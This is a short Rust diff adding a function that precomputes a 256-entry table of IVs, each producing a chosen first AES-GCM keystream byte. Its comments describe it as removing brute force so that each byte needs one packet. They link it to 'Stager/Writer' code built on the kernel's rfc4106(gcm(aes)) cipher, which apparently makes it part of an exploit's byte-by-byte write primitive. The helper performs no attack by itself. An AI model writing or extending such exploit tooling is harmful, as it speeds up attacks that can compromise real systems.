@@ -97,6 +97,28 @@ impl Aes128 {
     }
 }
 
+/// Pre-compute the 256-entry IV lookup table. For each possible XOR tag (0x00–0xFF),
+/// stores the 8-byte IV that produces that keystream byte. ~1724 iterations to find all 256.
+/// This eliminates brute-force: 1 packet per byte instead of ~256.
+pub fn build_iv_table(keymat_base: u8) -> [[u8; 8]; 256] {
+    let ks0 = keystream0(keymat_base);
+    let mut table = [[0u8; 8]; 256];
+    let mut found = [false; 256];
+    let mut count = 0usize;
+    let mut iv_int: u64 = 0;
+    while count < 256 {
+        let iv = iv_int.to_le_bytes();
+        let tag = ks0(&iv);
+        if !found[tag as usize] {
+            table[tag as usize] = iv;
+            found[tag as usize] = true;
+            count += 1;
+        }
+        iv_int += 1;
+    }
+    table
+}
+
 /// keystream0_fn(keymat_base): returns a closure iv(8B) -> first keystream byte, matching
 /// Stager/Writer rfc4106(gcm(aes)) counter block SALT|IV|0x00000002.
 pub fn keystream0(keymat_base: u8) -> impl Fn(&[u8; 8]) -> u8 {
